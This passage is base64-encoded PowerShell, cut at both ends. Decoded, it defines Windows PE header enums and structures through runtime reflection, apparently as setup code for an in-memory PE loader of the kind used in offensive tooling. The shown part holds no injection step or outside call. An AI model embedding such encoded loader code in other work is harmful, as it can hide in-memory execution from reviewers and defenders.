DY2NCkgfCBPdXQtTnVsbAogICAgICAgICRNYWNoaW5lVHlwZSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE1hY2hpbmVUeXBlIC1WYWx1ZSAkTWFjaGluZVR5cGUKCiAgICAgICAgI0VudW0gTWFnaWNUeXBlCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lRW51bSgnTWFnaWNUeXBlJywgJ1B1YmxpYycsIFtVSW50MTZdKQogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9OVF9PUFRJT05BTF9IRFIzMl9NQUdJQycsIFtVSW50MTZdIDB4MTBiKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX05UX09QVElPTkFMX0hEUjY0X01BR0lDJywgW1VJbnQxNl0gMHgyMGIpIHwgT3V0LU51bGwKICAgICAgICAkTWFnaWNUeXBlID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgICAgICRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTWFnaWNUeXBlIC1WYWx1ZSAkTWFnaWNUeXBlCgogICAgICAgICNFbnVtIFN1YlN5c3RlbVR5cGUKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVFbnVtKCdTdWJTeXN0ZW1UeXBlJywgJ1B1YmxpYycsIFtVSW50MTZdKQogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fVU5LTk9XTicsIFtVSW50MTZdIDApIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX05BVElWRScsIFtVSW50MTZdIDEpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX1dJTkRPV1NfR1VJJywgW1VJbnQxNl0gMikgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fV0lORE9XU19DVUknLCBbVUludDE2XSAzKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9QT1NJWF9DVUknLCBbVUludDE2XSA3KSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9XSU5ET1dTX0NFX0dVSScsIFtVSW50MTZdIDkpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX0VGSV9BUFBMSUNBVElPTicsIFtVSW50MTZdIDEwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9FRklfQk9PVF9TRVJWSUNFX0RSSVZFUicsIFtVSW50MTZdIDExKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9FRklfUlVOVElNRV9EUklWRVInLCBbVUludDE2XSAxMikgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fRUZJX1JPTScsIFtVSW50MTZdIDEzKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9YQk9YJywgW1VJbnQxNl0gMTQpIHwgT3V0LU51bGwKICAgICAgICAkU3ViU3lzdGVtVHlwZSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFN1YlN5c3RlbVR5cGUgLVZhbHVlICRTdWJTeXN0ZW1UeXBlCgogICAgICAgICNFbnVtIERsbENoYXJhY3RlcmlzdGljc1R5cGUKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVFbnVtKCdEbGxDaGFyYWN0ZXJpc3RpY3NUeXBlJywgJ1B1YmxpYycsIFtVSW50MTZdKQogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdSRVNfMCcsIFtVSW50MTZdIDB4MDAwMSkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdSRVNfMScsIFtVSW50MTZdIDB4MDAwMikgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdSRVNfMicsIFtVSW50MTZdIDB4MDAwNCkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdSRVNfMycsIFtVSW50MTZdIDB4MDAwOCkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExfQ0hBUkFDVEVSSVNUSUNTX0RZTkFNSUNfQkFTRScsIFtVSW50MTZdIDB4MDA0MCkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExfQ0hBUkFDVEVSSVNUSUNTX0ZPUkNFX0lOVEVHUklUWScsIFtVSW50MTZdIDB4MDA4MCkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExfQ0hBUkFDVEVSSVNUSUNTX05YX0NPTVBBVCcsIFtVSW50MTZdIDB4MDEwMCkgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfTk9fSVNPTEFUSU9OJywgW1VJbnQxNl0gMHgwMjAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX0RMTENIQVJBQ1RFUklTVElDU19OT19TRUgnLCBbVUludDE2XSAweDA0MDApIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX05PX0JJTkQnLCBbVUludDE2XSAweDA4MDApIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnUkVTXzQnLCBbVUludDE2XSAweDEwMDApIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX1dETV9EUklWRVInLCBbVUludDE2XSAweDIwMDApIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX1RFUk1JTkFMX1NFUlZFUl9BV0FSRScsIFtVSW50MTZdIDB4ODAwMCkgfCBPdXQtTnVsbAogICAgICAgICREbGxDaGFyYWN0ZXJpc3RpY3NUeXBlID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgICAgICRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZSAtVmFsdWUgJERsbENoYXJhY3RlcmlzdGljc1R5cGUKCiAgICAgICAgIyMjIyMjIyMjIyMgICAgU1RSVUNUICAgICMjIyMjIyMjIyMjCiAgICAgICAgI1N0cnVjdCBJTUFHRV9EQVRBX0RJUkVDVE9SWQogICAgICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgRXhwbGljaXRMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX0RBVEFfRElSRUNUT1JZJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgOCkKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdWaXJ0dWFsQWRkcmVzcycsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg0KSB8IE91dC1OdWxsCiAgICAgICAgJElNQUdFX0RBVEFfRElSRUNUT1JZID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgICAgICRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfREFUQV9ESVJFQ1RPUlkgLVZhbHVlICRJTUFHRV9EQVRBX0RJUkVDVE9SWQoKICAgICAgICAjU3RydWN0IElNQUdFX0ZJTEVfSEVBREVSCiAgICAgICAgJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9GSUxFX0hFQURFUicsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDIwKQogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFjaGluZScsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZTZWN0aW9ucycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVGltZURhdGVTdGFtcCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUG9pbnRlclRvU3ltYm9sVGFibGUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mU3ltYm9scycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mT3B0aW9uYWxIZWFkZXInLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NoYXJhY3RlcmlzdGljcycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAogICAgICAgICRJTUFHRV9GSUxFX0hFQURFUiA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICAgICAkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0ZJTEVfSEVBREVSIC1WYWx1ZSAkSU1BR0VfRklMRV9IRUFERVIKCiAgICAgICAgI1N0cnVjdCBJTUFHRV9PUFRJT05BTF9IRUFERVI2NAogICAgICAgICRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgRXhwbGljaXRMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX09QVElPTkFMX0hFQURFUjY0JywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMjQwKQogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01hZ2ljJywgJE1hZ2ljVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9yTGlua2VyVmVyc2lvbicsIFtCeXRlXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yTGlua2VyVmVyc2lvbicsIFtCeXRlXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMykgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkNvZGUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkluaXRpYWxpemVkRGF0YScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg4KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mVW5pbml0aWFsaXplZERhdGEnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdBZGRyZXNzT2ZFbnRyeVBvaW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE2KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQmFzZU9mQ29kZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgyMCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ltYWdlQmFzZScsIFtVSW50NjRdLCAnUHVibGljJykpLlNldE9mZnNldCgyNCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NlY3Rpb25BbGlnbm1lbnQnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMzIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdGaWxlQWxpZ25tZW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDM2KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JPcGVyYXRpbmdTeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JPcGVyYXRpbmdTeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JJbWFnZVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDQpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vckltYWdlVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0NikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9yU3Vic3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0OCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yU3Vic3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg1MCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1dpbjMyVmVyc2lvblZhbHVlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDUyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSW1hZ2UnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNTYpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZIZWFkZXJzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDYwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2hlY2tTdW0nLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNjQpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTdWJzeXN0ZW0nLCAkU3ViU3lzdGVtVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNjgpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEbGxDaGFyYWN0ZXJpc3RpY3MnLCAkRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNzApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZTdGFja1Jlc2VydmUnLCBbVUludDY0XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNzIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZTdGFja0NvbW1pdCcsIFtVSW50NjRdLCAnUHVibGljJykpLlNldE9mZnNldCg4MCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkhlYXBSZXNlcnZlJywgW1VJbnQ2NF0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDg4KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSGVhcENvbW1pdCcsIFtVSW50NjRdLCAnUHVibGljJykpLlNldE9mZnNldCg5NikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xvYWRlckZsYWdzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEwNCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mUnZhQW5kU2l6ZXMnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTA4KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRXhwb3J0VGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDExMikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ltcG9ydFRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMjApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdSZXNvdXJjZVRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMjgpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdFeGNlcHRpb25UYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTM2KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2VydGlmaWNhdGVUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTQ0KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQmFzZVJlbG9jYXRpb25UYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTUyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRGVidWcnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE2MCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FyY2hpdGVjdHVyZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTY4KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnR2xvYmFsUHRyJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNzYpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdUTFNUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTg0KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTG9hZENvbmZpZ1RhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxOTIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCb3VuZEltcG9ydCcsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjAwKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSUFUJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgyMDgpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEZWxheUltcG9ydERlc2NyaXB0b3InLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIxNikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NMUlJ1bnRpbWVIZWFkZXInLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIyNCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1Jlc2VydmVkJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgyMzIpIHwgT3V0LU51bGwKICAgICAgICAkSU1BR0VfT1BUSU9OQUxfSEVBREVSNjQgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICAgICAgJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9PUFRJT05BTF9IRUFERVI2NCAtVmFsdWUgJElNQUdFX09QVElPTkFMX0hFQURFUjY0CgogICAgICAgICNTdHJ1Y3QgSU1BR0VfT1BUSU9OQUxfSEVBREVSMzIKICAgICAgICAkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIEV4cGxpY2l0TGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9PUFRJT05BTF9IRUFERVIzMicsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDIyNCkKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWdpYycsICRNYWdpY1R5cGUsICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvckxpbmtlclZlcnNpb24nLCBbQnl0ZV0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vckxpbmtlclZlcnNpb24nLCBbQnl0ZV0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDMpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZDb2RlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZJbml0aWFsaXplZERhdGEnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoOCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZlVuaW5pdGlhbGl6ZWREYXRhJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEyKSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQWRkcmVzc09mRW50cnlQb2ludCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgxNikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0Jhc2VPZkNvZGUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCYXNlT2ZEYXRhJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDI0KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSW1hZ2VCYXNlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDI4KSB8IE91dC1OdWxsCiAgICAgICAgKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2VjdGlvbkFsaWdubWVudCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgzMikgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ZpbGVBbGlnbm1lbnQnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMzYpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvck9wZXJhdGluZ1N5c3RlbVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDApIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vck9wZXJhdGluZ1N5c3RlbVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDIpIHwgT3V0LU51bGwKICAgICAgICAoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvckltYWdlVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0NCkgfCBPdXQtTnVsbAogICAgICAgICgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9ySW1hZ2VWZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V